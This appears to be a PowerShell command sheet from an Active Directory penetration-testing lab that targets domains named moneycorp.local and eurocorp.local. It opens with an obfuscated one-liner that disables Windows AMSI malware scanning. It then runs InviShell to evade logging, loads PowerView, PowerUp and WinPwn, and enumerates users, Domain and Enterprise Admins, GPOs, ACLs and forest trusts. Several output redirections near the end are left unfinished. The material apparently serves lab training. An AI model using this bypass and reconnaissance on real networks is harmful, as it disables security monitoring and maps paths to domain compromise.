S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ) 
# change to tools 
cd C:\AD\Tools 
  
# Run invisishell 
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
  
. C:\AD\Tools\PowerView.ps1 
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll  
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1  
. C:\AD\Tools\PowerUp.ps1  
. C:\AD\Tools\Offline_WinPwn.ps1  
  
Get-DomainUser | select -ExpandProperty samaccountname > samaccountname.txt   
Get-DomainComputer | select -ExpandProperty dnshostname > dnshostname.txt  
Get-DomainGroup -Identity "Domain Admins" > group-domain-admins.txt  
Get-DomainGroupMember -Identity "Domain Admins" > members-domain-admins.txt  
Get-DomainGroupMember -Identity "Enterprise Admins" > members-enterprise-admins.txt  
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local > moneycorp-enterprise-admins.txt  
  
Get-ADUser -Filter * > ad-users.txt  
Get-ADUser -Filter * -Properties *| select Samaccountname,Description > ad-samaccountname.txt  
Get-ADComputer -Filter *  >  ad-computer.txt
Get-ADGroupMember -Identity 'Domain Admins'  > ad-members-domain-admins.txt 
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local  > ad-members-enterprise-admins.txt
  
Get-DomainOU  > domain-ou.txt
Get-DomainOU | select -ExpandProperty name  > names-domain-ou.txt
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name  > student-machines-domain-ou.txt
Get-DomainGPO  > domain-gpo.txt
(Get-DomainOU -Identity StudentMachines).gplink  > studentmachines-domaingpo.txt
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'  > identity-domaingpo.txt
Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11,(Get-DomainOU -Identity StudentMachines).gplink.length-72)  > gplink-studentmachines-domaingpo.txt
  
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose  > 
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student509"}  >
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}  >
  
Get-ForestDomain -Verbose  >
Get-DomainTrust  >
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}  >
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}  >
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}  >
(Get-ADForest).Domains  >
Get-ADTrust -Filter *  >
Get-ADForest | %{Get-ADTrust -Filter *}  >
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}  >
Get-ADTrust -Filter '(intraForest -ne $True) -and(ForestTransitive -ne $True)'  >
Get-ADTrust -Filter * -Server eurocorp.local  >
  
